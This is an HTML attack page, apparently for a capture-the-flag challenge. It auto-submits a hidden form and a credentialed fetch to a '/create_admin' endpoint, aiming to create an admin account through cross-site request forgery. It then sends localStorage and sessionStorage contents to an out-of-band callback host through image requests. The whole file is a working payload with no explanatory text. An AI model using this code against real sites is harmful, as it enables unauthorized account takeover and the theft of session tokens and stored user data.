<!DOCTYPE html>
<form method="POST" action="https://tasks.goidactf.ru:20395/create_admin" target="_blank">
    <input type="hidden" name="new_admin_login" value="HACKED_BY_BOT">
</form>
<script>
// Форма отправит куки автоматически
document.forms[0].submit();

// Пробуем также через fetch с credentials
setTimeout(() => {
    fetch('https://tasks.goidactf.ru:20395/create_admin', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        credentials: 'include', // Отправляет куки сессии
        mode: 'no-cors', // Чтобы избежать CORS ошибок при отправке
        body: 'new_admin_login=FETCH_ADMIN'
    });
}, 500);

// Проверяем, какие куки вообще есть
setTimeout(() => {
    // Отправляем сигнал о том что скрипт выполнился
    new Image().src = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/?script_executed=yes';
    
    // Пробуем прочитать localStorage/sessionStorage на всякий случай
    try {
        const ls = JSON.stringify(localStorage);
        new Image().src = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/?localStorage=' + encodeURIComponent(ls.substring(0, 1000));
    } catch(e) {}
    
    try {
        const ss = JSON.stringify(sessionStorage);
        new Image().src = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/?sessionStorage=' + encodeURIComponent(ss.substring(0, 1000));
    } catch(e) {}
}, 2000);
</script>
